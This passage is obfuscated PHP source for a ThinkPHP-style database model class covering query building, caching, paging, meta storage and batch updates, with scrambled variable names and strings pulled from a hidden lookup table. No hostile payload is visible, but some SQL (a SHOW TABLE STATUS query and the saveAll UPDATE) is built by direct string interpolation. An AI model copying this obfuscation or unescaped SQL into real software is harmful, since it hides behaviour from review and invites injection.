$this->db; } static $õµ˜Íı… = array(); static $¯¨ø¨ˆç = array(); if (!isset($¯¨ø¨ˆç[$•‚øïÛ]) || isset($¯¨ø¨ˆç[$•‚øïÛ]) && $ãıÄ·æÃ && $õµ˜Íı…[$•‚øïÛ] != $ãıÄ·æÃ) { if (!empty($ãıÄ·æÃ) && is_string($ãıÄ·æÃ) && !1 === strpos($ãıÄ·æÃ, $‚Â­Øùğ[8])) { $ãıÄ·æÃ = think_config($ãıÄ·æÃ); } $•‚øïÛ = think_guid($ãıÄ·æÃ); $¯¨ø¨ˆç[$•‚øïÛ] = Db::getInstance($ãıÄ·æÃ); } elseif (NULL === $ãıÄ·æÃ) { $¯¨ø¨ˆç[$•‚øïÛ]->close(); unset($¯¨ø¨ˆç[$•‚øïÛ]); return; } if (!empty($ÏĞ‘”)) { if (is_string($ÏĞ‘”)) { parse_str($ÏĞ‘”, $ÏĞ‘”); } foreach ($ÏĞ‘” as $¸†”¨ä => $æşù¾ïÄ) { $this->setProperty($¸†”¨ä, $æşù¾ïÄ); } } $õµ˜Íı…[$•‚øïÛ] = $ãıÄ·æÃ; $this->db = $¯¨ø¨ˆç[$•‚øïÛ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $´œÇÁ¨‡ = get_class($this); if ($´œÇÁ¨‡ == $_SERVER[ï»»·÷á][346]) { return $this->name; } $this->name = substr($´œÇÁ¨‡, 0, -5); } return $this->name; } public function getTableName() { $‹¦›ñö÷ =& $_SERVER[ï»»·÷á]; if (empty($this->trueTableName)) { $ÈÚ¦œ‹î = !empty($this->tablePrefix) ? $this->tablePrefix : $‹¦›ñö÷[12]; if (!empty($this->tableName)) { $ÈÚ¦œ‹î .= $this->tableName; } else { $ÈÚ¦œ‹î .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÈÚ¦œ‹î); } return (!empty($this->dbName) ? $this->dbName . $‹¦›ñö÷[10] : $‹¦›ñö÷[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ãµ´İï… =& $_SERVER[ï»»·÷á]; return isset($this->fields[$Ãµ´İï…[251]]) ? $this->fields[$Ãµ´İï…[251]] : $this->pk; } public function getDbFields() { $ãµÈ¥Ôç =& $_SERVER[ï»»·÷á]; if (isset($this->options[$ãµÈ¥Ôç[279]])) { $‘Ãè®ö¦ = $this->db->getFields($this->options[$ãµÈ¥Ôç[279]]); return $‘Ãè®ö¦ ? array_keys($‘Ãè®ö¦) : !1; } if ($this->fields) { $‘Ãè®ö¦ = $this->fields; unset($‘Ãè®ö¦[$ãµÈ¥Ôç[250]], $‘Ãè®ö¦[$ãµÈ¥Ôç[251]], $‘Ãè®ö¦[$ãµÈ¥Ôç[252]], $‘Ãè®ö¦[$ãµÈ¥Ôç[249]]); return $‘Ãè®ö¦; } return !1; } public function data($ß°ñ· ¥ = '') { $‡–ø¤óÕ =& $_SERVER[ï»»·÷á]; if ($‡–ø¤óÕ[12] === $ß°ñ· ¥ && !empty($this->data)) { return $this->data; } if (is_object($ß°ñ· ¥)) { $ß°ñ· ¥ = get_object_vars($ß°ñ· ¥); } elseif (is_string($ß°ñ· ¥)) { parse_str($ß°ñ· ¥, $ß°ñ· ¥); } elseif (!is_array($ß°ñ· ¥)) { think_exception(think_lang($‡–ø¤óÕ[271])); } $this->data = $ß°ñ· ¥; return $this; } public function join($ş«İĞç) { $…ûÙ¿èÈ =& $_SERVER[ï»»·÷á]; if (is_array($ş«İĞç)) { $this->options[$…ûÙ¿èÈ[282]] = $ş«İĞç; } elseif (!empty($ş«İĞç)) { $this->options[$…ûÙ¿èÈ[282]][] = $ş«İĞç; } return $this; } public function union($·£ùòĞ¬, $š—âäˆÌ = false) { $¼¦§¸Í =& $_SERVER[ï»»·÷á]; if (empty($·£ùòĞ¬)) { return $this; } if ($š—âäˆÌ) { $this->options[$¼¦§¸Í[347]][$¼¦§¸Í[348]] = !0; } if (is_object($·£ùòĞ¬)) { $·£ùòĞ¬ = get_object_vars($·£ùòĞ¬); } if (is_string($·£ùòĞ¬)) { $ÊŸƒ¦†û = $·£ùòĞ¬; } elseif (is_array($·£ùòĞ¬)) { if (isset($·£ùòĞ¬[0])) { $this->options[$¼¦§¸Í[347]] = array_merge($this->options[$¼¦§¸Í[347]], $·£ùòĞ¬); return $this; } else { $ÊŸƒ¦†û = $·£ùòĞ¬; } } else { think_exception(think_lang($¼¦§¸Í[271])); } $this->options[$¼¦§¸Í[347]][] = $ÊŸƒ¦†û; return $this; } public function cache($Ò´åİŸ = true, $‡¢‚›¨¯ = null, $ÍÙ¶ÜÇ = '') { $Ê“÷ô¿û =& $_SERVER[ï»»·÷á]; if (!1 !== $Ò´åİŸ) { $this->options[$Ê“÷ô¿û[349]] = array($Ê“÷ô¿û[94] => $Ò´åİŸ, $Ê“÷ô¿û[339] => $‡¢‚›¨¯, $Ê“÷ô¿û[33] => $ÍÙ¶ÜÇ); } return $this; } public function field($«ÒÑ¹¬, $Üšõ¾äì = false) { $¥äÇü™ =& $_SERVER[ï»»·÷á]; if (!0 === $«ÒÑ¹¬) { $üÃš¨™¿ = $this->getDbFields(); $«ÒÑ¹¬ = $üÃš¨™¿ ? $üÃš¨™¿ : $¥äÇü™[189]; } elseif ($Üšõ¾äì) { if (is_string($«ÒÑ¹¬)) { $«ÒÑ¹¬ = explode($¥äÇü™[50], $«ÒÑ¹¬); } $üÃš¨™¿ = $this->getDbFields(); $«ÒÑ¹¬ = $üÃš¨™¿ ? array_diff($üÃš¨™¿, $«ÒÑ¹¬) : $«ÒÑ¹¬; } $this->options[$¥äÇü™[273]] = $«ÒÑ¹¬; return $this; } public function scope($—ñ÷ıÜ = '', $Ûê‹¥›‹ = NULL) { $ÄÖËÖ½¤ =& $_SERVER[ï»»·÷á]; if ($ÄÖËÖ½¤[12] === $—ñ÷ıÜ) { if (isset($this->_scope[$ÄÖËÖ½¤[37]])) { $”ÎÔ’ÒÊ = $this->_scope[$ÄÖËÖ½¤[37]]; } else { return $this; } } elseif (is_string($—ñ÷ıÜ)) { $’¸ûÊ¥ª = explode($ÄÖËÖ½¤[50], $—ñ÷ıÜ); $”ÎÔ’ÒÊ = array(); foreach ($’¸ûÊ¥ª as $Ä¸¢¿æ…) { if (!isset($this->_scope[$Ä¸¢¿æ…])) { continue; } $”ÎÔ’ÒÊ = array_merge($”ÎÔ’ÒÊ, $this->_scope[$Ä¸¢¿æ…]); } if (!empty($Ûê‹¥›‹) && is_array($Ûê‹¥›‹)) { $”ÎÔ’ÒÊ = array_merge($”ÎÔ’ÒÊ, $Ûê‹¥›‹); } } elseif (is_array($—ñ÷ıÜ)) { $”ÎÔ’ÒÊ = $—ñ÷ıÜ; } if (is_array($”ÎÔ’ÒÊ) && !empty($”ÎÔ’ÒÊ)) { $this->options = array_merge($this->options, array_change_key_case($”ÎÔ’ÒÊ)); } return $this; } public function where($€éØ™î£, $ªß¾ë© = null) { $Ë°ÀõÙÄ =& $_SERVER[ï»»·÷á]; if (!is_null($ªß¾ë©) && is_string($€éØ™î£)) { if (!is_array($ªß¾ë©)) { $ªß¾ë© = func_get_args(); array_shift($ªß¾ë©); } $ªß¾ë© = array_map(array($this->db, $Ë°ÀõÙÄ[343]), $ªß¾ë©); $€éØ™î£ = vsprintf($€éØ™î£, $ªß¾ë©); } elseif (is_object($€éØ™î£)) { $€éØ™î£ = get_object_vars($€éØ™î£); } elseif (is_array($€éØ™î£)) { foreach ($€éØ™î£ as $ÕÅÀçÁŞ => $²œ«§É…) { if ((is_numeric($ÕÅÀçÁŞ) || !$ÕÅÀçÁŞ) && is_string($²œ«§É…)) { if (strpos($²œ«§É…, $Ë°ÀõÙÄ[350]) === 0) { continue; } think_trace($Ë°ÀõÙÄ[351], $Ë°ÀõÙÄ[12], $Ë°ÀõÙÄ[49]); die; } } } if (is_string($€éØ™î£) && $Ë°ÀõÙÄ[12] != $€éØ™î£) { $İ¨’Ï…  = array(); $İ¨’Ï… [$Ë°ÀõÙÄ[352]] = $€éØ™î£; $€éØ™î£ = $İ¨’Ï… ; } if (isset($this->options[$Ë°ÀõÙÄ[275]])) { $this->options[$Ë°ÀõÙÄ[275]] = array_merge($this->options[$Ë°ÀõÙÄ[275]], $€éØ™î£); } else { $this->options[$Ë°ÀõÙÄ[275]] = $€éØ™î£; } return $this; } public function limit($»È§¿¾ò, $«Ä“€– = null) { $™ğï°—ò =& $_SERVER[ï»»·÷á]; $this->options[$™ğï°—ò[292]] = is_null($«Ä“€–) ? $»È§¿¾ò : $»È§¿¾ò . $™ğï°—ò[50] . $«Ä“€–; return $this; } public function page($Â€½ëËÚ, $ğğÊ€ = null) { $ğŸ¿÷›Â =& $_SERVER[ï»»·÷á]; $this->options[$ğŸ¿÷›Â[353]] = is_null($ğğÊ€) ? $Â€½ëËÚ : $Â€½ëËÚ . $ğŸ¿÷›Â[50] . $ğğÊ€; return $this; } public function comment($Ş¹ø çû) { $this->options[$_SERVER[ï»»·÷á][354]] = $Ş¹ø çû; return $this; } public function setProperty($¸¢¯ûõª, $°ïŞ½º×) { if (property_exists($this, $¸¢¯ûõª)) { $this->{$¸¢¯ûõª} = $°ïŞ½º×; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\x79\x54\151\155\x65", "\164\x69\155\x65", "\x69\156\163\x65\162\164\54\x75\x70\144\141\x74\x65", "\146\165\156\143\x74\151\x6f\156"), array("\143\162\145\x61\164\x65\124\x69\x6d\x65", "\164\151\155\x65", "\151\156\163\x65\162\164", "\x66\x75\156\143\x74\x69\157\156")); public function setDataAuto($Óš×å) { $this->dataAuto = $Óš×å; } public function __construct($Èê«Öüè = '', $ÏØ÷÷³Ø = '', $ÔœáŸÌŠ = '') { parent::__construct($Èê«Öüè, $ÏØ÷÷³Ø, $ÔœáŸÌŠ); } protected $tableMeta = array(); protected function _beforeInsert(&$Ï³çáñÛ, $„¥Ôæ¬º) { $¡Ñåò©ú =& $_SERVER[ï»»·÷á]; if (!$this->checkDataAutoHas($¡Ñåò©ú[355])) { return; } $this->dataBeforeFilter($Ï³çáñÛ, $¡Ñåò©ú[355]); } protected function _beforeUpdate(&$Á‚´Şè†, $‹ÌŒÇœ·) { $Ñş–ÀŠ =& $_SERVER[ï»»·÷á]; if (!$this->checkDataAutoHas($Ñş–ÀŠ[356])) { return; } $this->dataBeforeFilter($Á‚´Şè†, $Ñş–ÀŠ[356]); } protected function _afterSelect(&$íıå¨îÁ, $±Äç½¿) { if (!is_array($íıå¨îÁ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ï»»·÷á][357])) { return; } foreach ($íıå¨îÁ as &$çŸ·ì) { $this->dataAfterFilter($çŸ·ì); } unset($çŸ·ì); } protected function _afterFind(&$¢ªµÓÀÏ, $½£ô“Ã) { if (!is_array($¢ªµÓÀÏ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ï»»·÷á][357])) { return; } $this->dataAfterFilter($¢ªµÓÀÏ); } public static function textEncode($‡˜ÕéÖ¹) { if (!$‡˜ÕéÖ¹) { return $‡˜ÕéÖ¹; } $ §¤‰»Ê = json_encode($‡˜ÕéÖ¹); $ §¤‰»Ê = preg_replace_callback($_SERVER[ï»»·÷á][358], function ($˜à®¹„¸) { return addslashes($˜à®¹„¸[0]); }, $ §¤‰»Ê); return json_decode($ §¤‰»Ê); } public static function textDecode($ôùÓşÚ) { $Å·²»ø =& $_SERVER[ï»»·÷á]; $«á×²Ûã = json_encode($ôùÓşÚ); $«á×²Ûã = preg_replace_callback($Å·²»ø[359], function ($¦¢ÛÚ¹ø) { return $_SERVER[ï»»·÷á][97]; }, $«á×²Ûã); return json_decode($«á×²Ûã); } public function setAutoIncrement($«°‚ûÔ) { $ÇÄ¥›¯Õ = array($this->getPk() => $«°‚ûÔ); $åÍˆĞÎ  = $this->data($ÇÄ¥›¯Õ)->add(); if ($åÍˆĞÎ ) { $this->delete($åÍˆĞÎ ); } } public function getAutoIncrement() { $…˜‰ŒØ° = $this->getTableName(); $ß°É½ëå = $this->max($this->getPk()); $Ğº„¯ª² = $this->query("\x73\x68\x6f\x77\40\164\141\142\x6c\x65\x20\x73\164\141\164\x75\x73\40\167\150\x65\162\x65\40\x4e\x61\x6d\145\75\47{$…˜‰ŒØ°}\x27"); $í’§¶Å¢ = $Ğº„¯ª²[0][$_SERVER[ï»»·÷á][360]]; $–…¥÷“è = max($ß°É½ëå, $í’§¶Å¢); return $–…¥÷“è; } protected function _callBefore($…ÈŠä•‘, $®ªÀñ¸) { return $this->cacheCallCheck($…ÈŠä•‘, $®ªÀñ¸, !1); } protected function _callAfter($º­³ÉäÙ, $®óğ¾ÅÈ) { return $this->cacheCallCheck($º­³ÉäÙ, $®óğ¾ÅÈ, !0); } protected function cacheFunctionAlias($£ªÉÊ˜´) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($®í±û±º, $èõ´¬‹ó, $ãÓüª¯¡ = false) { $Ò°Ûùãü = $this->cacheFunctionAlias($èõ´¬‹ó); if (!$Ò°Ûùãü) { return; } foreach ($Ò°Ûùãü as $ñÔÀ©È’ => $º†Ììôæ) { $ŞîÙğõ = $º†Ììôæ[0]; $ªÑÜ©øª = explode($_SERVER[ï»»·÷á][50], $º†Ììôæ[1]); if ($®í±û±º == $ñÔÀ©È’) { return $this->cacheFunctionGet($ñÔÀ©È’, $ŞîÙğõ); } if ($ãÓüª¯¡ && in_array($®í±û±º, $ªÑÜ©øª)) { $this->cacheFunctionClear($ñÔÀ©È’, $ŞîÙğõ); } } } public function cacheFunctionGet($Â˜¸ä¸¹, $–ğ€åÂâ) { $‘‹¬Ä¿Š = $this->cacheKeyMake($Â˜¸ä¸¹, $–ğ€åÂâ); $×ÆÁ¥ƒù = Cache::get($‘‹¬Ä¿Š); if (!is_array($×ÆÁ¥ƒù)) { $×ÆÁ¥ƒù = call_user_func_array(array($this, $Â˜¸ä¸¹), array($–ğ€åÂâ, !0)); Cache::set($‘‹¬Ä¿Š, $×ÆÁ¥ƒù); } return $×ÆÁ¥ƒù; } public function cacheFunctionClear($“Úùã¨, $ÆÌóø¥ˆ) { $ñå®†¨¬ = $ÆÌóø¥ˆ; if (!is_array($ÆÌóø¥ˆ)) { $ñå®†¨¬ = array($ÆÌóø¥ˆ); } foreach ($ñå®†¨¬ as $ú€éôĞ) { $ïÎ¢ÂÇ = $this->cacheKeyMake($“Úùã¨, $ú€éôĞ); Cache::remove($ïÎ¢ÂÇ); } } private function cacheKeyMake($£½„ıü, $ïø¥Ò…Ä) { $úÏ¢µİÆ =& $_SERVER[ï»»·÷á]; return get_class($this) . $úÏ¢µİÆ[11] . $£½„ıü . $úÏ¢µİÆ[361] . $ïø¥Ò…Ä; } protected function selectPageReset() { $»“¹ıÒé =& $_SERVER[ï»»·÷á]; if (isset($GLOBALS[$»“¹ıÒé[362]])) { return; } $GLOBALS[$»“¹ıÒé[362]] = isset($GLOBALS[$»“¹ıÒé[7]][$»“¹ıÒé[363]]) ? $GLOBALS[$»“¹ıÒé[7]][$»“¹ıÒé[363]] : !1; $GLOBALS[$»“¹ıÒé[364]] = isset($GLOBALS[$»“¹ıÒé[7]][$»“¹ıÒé[353]]) ? $GLOBALS[$»“¹ıÒé[7]][$»“¹ıÒé[353]] : !1; $GLOBALS[$»“¹ıÒé[7]][$»“¹ıÒé[363]] = !1; $GLOBALS[$»“¹ıÒé[7]][$»“¹ıÒé[353]] = !1; } protected function selectPageRestore() { $º–°‡€§ =& $_SERVER[ï»»·÷á]; if (!isset($GLOBALS[$º–°‡€§[362]])) { return; } $GLOBALS[$º–°‡€§[7]][$º–°‡€§[363]] = $GLOBALS[$º–°‡€§[362]]; $GLOBALS[$º–°‡€§[7]][$º–°‡€§[353]] = $GLOBALS[$º–°‡€§[364]]; if ($GLOBALS[$º–°‡€§[7]][$º–°‡€§[363]] === !1) { unset($GLOBALS[$º–°‡€§[7]][$º–°‡€§[363]]); } if ($GLOBALS[$º–°‡€§[7]][$º–°‡€§[353]] === !1) { unset($GLOBALS[$º–°‡€§[7]][$º–°‡€§[353]]); } unset($GLOBALS[$º–°‡€§[362]]); unset($GLOBALS[$º–°‡€§[364]]); } protected function selectPage($ÂÔõğ¤¤ = 200, $ÈÔˆîĞ = 1) { $ÔÅƒ¬«® =& $_SERVER[ï»»·÷á]; global $in; $¾òŠİŒä = $this->optionsValue(); $’ö¾·‰ = 50000; $ÂÔõğ¤¤ = isset($in[$ÔÅƒ¬«®[363]]) && $in[$ÔÅƒ¬«®[363]] ? $in[$ÔÅƒ¬«®[363]] : $ÂÔõğ¤¤; if ($ÂÔõğ¤¤ === -1) { $in[$ÔÅƒ¬«®[363]] = !1; $’ö¾·‰ = 100000000; $ÂÔõğ¤¤ = $’ö¾·‰; } $«Ë‹¯Şì = $¾òŠİŒä; $«Ë‹¯Şì[$ÔÅƒ¬«®[365]] = array(); $ÂÔõğ¤¤ = intval($ÂÔõğ¤¤); $ÂÔõğ¤¤ = $ÂÔõğ¤¤ <= 5 ? 5 : ($ÂÔõğ¤¤ >= $’ö¾·‰ ? $’ö¾·‰ : $ÂÔõğ¤¤); $ÈÔˆîĞ = intval(isset($in[$ÔÅƒ¬«®[353]]) && $in[$ÔÅƒ¬«®[353]] ? $in[$ÔÅƒ¬«®[353]] : $ÈÔˆîĞ); $ÈÔˆîĞ = $ÈÔˆîĞ <= 1 ? 1 : $ÈÔˆîĞ; $½â×¶• = array(); $Äİªš„± = 1; if ($ÈÔˆîĞ == 1 && $Äİªš„±) { $this->optionsValue($¾òŠİŒä); $½â×¶• = $this->page($ÈÔˆîĞ, $ÂÔõğ¤¤)->select(); $²Ä£Ò¯ø = is_array($½â×¶•) ? count($½â×¶•) : 0; if ($²Ä£Ò¯ø < $ÂÔõğ¤¤) { $ŞÄ¯Ü = 1; } else { $this->optionsValue($«Ë‹¯Şì); $²Ä£Ò¯ø = intval($this->count()); $ŞÄ¯Ü = ceil($²Ä£Ò¯ø / $ÂÔõğ¤¤); } } else { $this->optionsValue($«Ë‹¯Şì); $²Ä£Ò¯ø = intval($this->count()); $ŞÄ¯Ü = ceil($²Ä£Ò¯ø / $ÂÔõğ¤¤); $ÈÔˆîĞ = $ÈÔˆîĞ >= $ŞÄ¯Ü ? $ŞÄ¯Ü : $ÈÔˆîĞ; $this->optionsValue($¾òŠİŒä); $½â×¶• = $this->page($ÈÔˆîĞ, $ÂÔõğ¤¤)->select(); } if (!is_array($½â×¶•)) { $½â×¶• = array(); } if ($ŞÄ¯Ü == 1) { $²Ä£Ò¯ø = count($½â×¶•); } $¦Ø¯ãÏä = array($ÔÅƒ¬«®[366] => array($ÔÅƒ¬«®[367] => $²Ä£Ò¯ø, $ÔÅƒ¬«®[363] => $ÂÔõğ¤¤, $ÔÅƒ¬«®[353] => $ÈÔˆîĞ, $ÔÅƒ¬«®[368] => $ŞÄ¯Ü), $ÔÅƒ¬«®[369] => $½â×¶•); return $¦Ø¯ãÏä; } protected function checkLength($œ³ı÷, $ŒŠ©ö¬î = 0, $¶äŸ¼² = '') { $ÎøÙ„ƒ‘ =& $_SERVER[ï»»·÷á]; $ŒŠ©ö¬î = $ŒŠ©ö¬î ? $ŒŠ©ö¬î : 65536; if (!$œ³ı÷ || strlen($œ³ı÷) < $ŒŠ©ö¬î) { return; } $¶äŸ¼² = $¶äŸ¼² ? $¶äŸ¼² . $ÎøÙ„ƒ‘[71] : $ÎøÙ„ƒ‘[12]; show_json($¶äŸ¼² . LNG($ÎøÙ„ƒ‘[370]) . "\x28{$ŒŠ©ö¬î}\51", !1); } protected function metaSet($àØŠ±ÇË, $»æ›úÎÇ = null, $øıæÈÍ = null) { $˜úÑå³ =& $_SERVER[ï»»·÷á]; if (!$this->tableMeta || !$àØŠ±ÇË) { return !1; } $¿ÖÅèÆî = $this->tableMeta[$˜úÑå³[371]]; $®² Å¦Á = $this->tableMeta[$˜úÑå³[372]]; $´çüÁ±“ = Model($®² Å¦Á); $’ì÷¬ğ§ = array($¿ÖÅèÆî => $àØŠ±ÇË, $˜úÑå³[373] => $»æ›úÎÇ); if (is_null($»æ›úÎÇ)) { return $´çüÁ±“->where(array($¿ÖÅèÆî => $àØŠ±ÇË))->delete(); } if (is_null($øıæÈÍ) && is_string($»æ›úÎÇ)) { return $´çüÁ±“->where($’ì÷¬ğ§)->delete(); } $“ÎŠîĞ– = is_array($»æ›úÎÇ) ? $»æ›úÎÇ : array(); if (is_string($»æ›úÎÇ)) { $“ÎŠîĞ–[$»æ›úÎÇ] = $øıæÈÍ; } $Ñ‰îÓ‰¥ = array(); foreach ($“ÎŠîĞ– as $Ö½’”˜õ => $œ¿„ø¡”) { if (is_null($œ¿„ø¡”) && is_string($Ö½’”˜õ)) { $´çüÁ±“->where(array($¿ÖÅèÆî => $àØŠ±ÇË, $˜úÑå³[373] => $Ö½’”˜õ))->delete(); continue; } $this->checkLength($œ¿„ø¡”, !1, $®² Å¦Á . $˜úÑå³[4] . $Ö½’”˜õ); $Ñ‰îÓ‰¥[] = array($¿ÖÅèÆî => $àØŠ±ÇË, $˜úÑå³[94] => $Ö½’”˜õ, $˜úÑå³[374] => $œ¿„ø¡”); } $¬Ë¹¯ŸÅ = $˜úÑå³[375] . $®² Å¦Á; CacheLock::lock($¬Ë¹¯ŸÅ); $´çüÁ±“->where(array($¿ÖÅèÆî => $àØŠ±ÇË))->addAll($Ñ‰îÓ‰¥, array(), !0); CacheLock::unlock($¬Ë¹¯ŸÅ); return !0; } public function metaGet($é¶áÊ¨µ, $¹È†´¯¤ = false) { $áêë£·ì =& $_SERVER[ï»»·÷á]; if (!$this->tableMeta) { return array(); } $·°øãó„ = $this->tableMeta[$áêë£·ì[371]]; $Í ª‚Õ = Model($this->tableMeta[$áêë£·ì[372]]); if ($¹È†´¯¤) { $éÒÎÚ¹« = array($·°øãó„ => $é¶áÊ¨µ, $áêë£·ì[94] => $¹È†´¯¤); return $Í ª‚Õ->where($éÒÎÚ¹«)->getField($áêë£·ì[374]); } $éÒÎÚ¹« = array($·°øãó„ => $é¶áÊ¨µ); $âÁÎ±²ç = $Í ª‚Õ->field($áêë£·ì[376])->where($éÒÎÚ¹«)->select(); $âÁÎ±²ç = array_to_keyvalue($âÁÎ±²ç, $áêë£·ì[94], $áêë£·ì[374]); return $âÁÎ±²ç; } private function checkDataAutoHas($¡è×Š£í) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $®–•ÅªÙ) { if (in_array($¡è×Š£í, explode($_SERVER[ï»»·÷á][50], $®–•ÅªÙ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÌĞßÔƒ‚, $•İíßÜû) { $Ê¹¤¸º² =& $_SERVER[ï»»·÷á]; if (!is_array($ÌĞßÔƒ‚)) { return; } foreach ($this->dataAuto as $³ÉŠËÚÚ) { $¡”§ªáø = $³ÉŠËÚÚ[0]; if (!in_array($•İíßÜû, explode($Ê¹¤¸º²[50], $³ÉŠËÚÚ[2]))) { continue; } switch (trim($³ÉŠËÚÚ[3])) { case $Ê¹¤¸º²[321]: case $Ê¹¤¸º²[322]: $“–üË‰¬ = $³ÉŠËÚÚ[1]; $çŞÖ† = isset($³ÉŠËÚÚ[4]) ? (array) $³ÉŠËÚÚ[4] : array(); if ($“–üË‰¬ == $Ê¹¤¸º²[180] && array_key_exists($¡”§ªáø, $ÌĞßÔƒ‚)) { if (!$ÌĞßÔƒ‚[$¡”§ªáø]) { unset($ÌĞßÔƒ‚[$¡”§ªáø]); } break; } if (isset($ÌĞßÔƒ‚[$¡”§ªáø])) { array_unshift($çŞÖ†, $ÌĞßÔƒ‚[$¡”§ªáø]); } if ($Ê¹¤¸º²[321] == $³ÉŠËÚÚ[3]) { $ÌĞßÔƒ‚[$¡”§ªáø] = call_user_func_array($“–üË‰¬, $çŞÖ†); } else { $ÌĞßÔƒ‚[$¡”§ªáø] = call_user_func_array(array(&$this, $“–üË‰¬), $çŞÖ†); } break; case $Ê¹¤¸º²[270]: if (isset($ÌĞßÔƒ‚[$¡”§ªáø]) && $ÌĞßÔƒ‚[$¡”§ªáø]) { $ÌĞßÔƒ‚[$¡”§ªáø] = call_user_func_array(array(&$this, $³ÉŠËÚÚ[1]), array($ÌĞßÔƒ‚[$¡”§ªáø])); } break; case $Ê¹¤¸º²[273]: $ÌĞßÔƒ‚[$¡”§ªáø] = $ÌĞßÔƒ‚[$³ÉŠËÚÚ[1]]; break; case $Ê¹¤¸º²[294]: if (isset($ÌĞßÔƒ‚[$¡”§ªáø]) && !is_string($ÌĞßÔƒ‚[$¡”§ªáø])) { $ÌĞßÔƒ‚[$¡”§ªáø] = json_encode_force($ÌĞßÔƒ‚[$¡”§ªáø]); } break; case $Ê¹¤¸º²[323]: if ($ÌĞßÔƒ‚[$¡”§ªáø] === $Ê¹¤¸º²[12]) { unset($ÌĞßÔƒ‚[$¡”§ªáø]); } break; case $Ê¹¤¸º²[324]: $ÌĞßÔƒ‚[$¡”§ªáø] = $³ÉŠËÚÚ[1]; default: break; } } if ($•İíßÜû == $Ê¹¤¸º²[355]) { $µöïÕ²Œ = strtolower($this->db->getDbType()); if (strpos($µöïÕ²Œ, $Ê¹¤¸º²[13]) !== 0) { return; } $ëùÁ¤úÀ = $this->field(!0)->fields; $Êì½Ü = $ëùÁ¤úÀ[$Ê¹¤¸º²[252]]; if (isset($ëùÁ¤úÀ[$Ê¹¤¸º²[251]])) { unset($Êì½Ü[$ëùÁ¤úÀ[$Ê¹¤¸º²[251]]]); } foreach ($Êì½Ü as $ÓŠÆÅœÕ => $•İíßÜû) { if (!isset($ÌĞßÔƒ‚[$ÓŠÆÅœÕ])) { $ÌĞßÔƒ‚[$ÓŠÆÅœÕ] = $Ê¹¤¸º²[12]; } } } } private function dataAfterFilter(&$Ï¹§ÎÓ) { $ÊËÖ£Ìï =& $_SERVER[ï»»·÷á]; foreach ($this->dataAuto as $‘Š¼êû) { $âÕïà¡• = $‘Š¼êû[0]; if (!isset($Ï¹§ÎÓ[$âÕïà¡•])) { continue; } if (!in_array($ÊËÖ£Ìï[357], explode($ÊËÖ£Ìï[50], $‘Š¼êû[2]))) { continue; } switch (trim($‘Š¼êû[3])) { case $ÊËÖ£Ìï[321]: case $ÊËÖ£Ìï[322]: $âîÈ…„ = isset($‘Š¼êû[4]) ? (array) $‘Š¼êû[4] : array(); array_unshift($âîÈ…„, $Ï¹§ÎÓ[$âÕïà¡•]); if (isset($‘Š¼êû[4]) && $‘Š¼êû[4] == $ÊËÖ£Ìï[377]) { $âîÈ…„ = array($Ï¹§ÎÓ[$âÕïà¡•]); } if ($ÊËÖ£Ìï[321] == $‘Š¼êû[3]) { $Ï¹§ÎÓ[$âÕïà¡•] = call_user_func_array($‘Š¼êû[1], $âîÈ…„); } else { $Ï¹§ÎÓ[$âÕïà¡•] = call_user_func_array(array(&$this, $‘Š¼êû[1]), $âîÈ…„); } break; case $ÊËÖ£Ìï[270]: if (isset($Ï¹§ÎÓ[$âÕïà¡•]) && $Ï¹§ÎÓ[$âÕïà¡•]) { $Ï¹§ÎÓ[$âÕïà¡•] = call_user_func_array(array(&$this, $‘Š¼êû[1]), array($Ï¹§ÎÓ[$âÕïà¡•])); } break; case $ÊËÖ£Ìï[273]: $Ï¹§ÎÓ[$âÕïà¡•] = $Ï¹§ÎÓ[$‘Š¼êû[1]]; break; case $ÊËÖ£Ìï[294]: $¢±úí‹Ø = $Ï¹§ÎÓ[$âÕïà¡•]; $Ï¹§ÎÓ[$âÕïà¡•] = json_decode($¢±úí‹Ø, !0); if (is_null($Ï¹§ÎÓ[$âÕïà¡•])) { $Ï¹§ÎÓ[$âÕïà¡•] = $¢±úí‹Ø; } break; case $ÊËÖ£Ìï[323]: if ($Ï¹§ÎÓ[$âÕïà¡•] === $ÊËÖ£Ìï[12]) { unset($Ï¹§ÎÓ[$âÕïà¡•]); } break; case $ÊËÖ£Ìï[324]: $Ï¹§ÎÓ[$âÕïà¡•] = $‘Š¼êû[1]; break; default: break; } } } public function saveAll($ˆªŞ˜ëà) { $”çè‹› =& $_SERVER[ï»»·÷á]; $½¢Â‡» = $this->tablePrefix . $this->tableName; $ÆĞÎÊ™Ç = self::SQL_WHERE_IN_CHUNK; $ˆªŞ˜ëà = is_array($ˆªŞ˜ëà) ? $ˆªŞ˜ëà : array(); $Í¨Íƒï… = $”çè‹›[378]; $é¯…®Å = 0; $ì°ïî²” = array(); $¶Ê«§›€ = count($ˆªŞ˜ëà); for ($ÀºˆŒÉÄ = 0; $ÀºˆŒÉÄ < $¶Ê«§›€; $ÀºˆŒÉÄ++) { $°¯Œ†±ô = $ˆªŞ˜ëà[$ÀºˆŒÉÄ]; if (!is_array($°¯Œ†±ô) || count($°¯Œ†±ô) != 4) { continue; } $ßÒ¤¶Š = "\125\x50\x44\101\x54\x45\40\x60{$½¢Â‡»}\140\x20\x53\x45\124\x20{$°¯Œ†±ô[2]}\x20\75\x20\x43\101\x53\105\x20{$°¯Œ†±ô[0]}\x20\12"; if ($é¯…®Å == 0) { $Í¨Íƒï… = $ßÒ¤¶Š; } $ì°ïî²”[] = $”çè‹›[118] . $°¯Œ†±ô[1] . $”çè‹›[118]; $é¯…®Å++; $Í¨Íƒï… .= 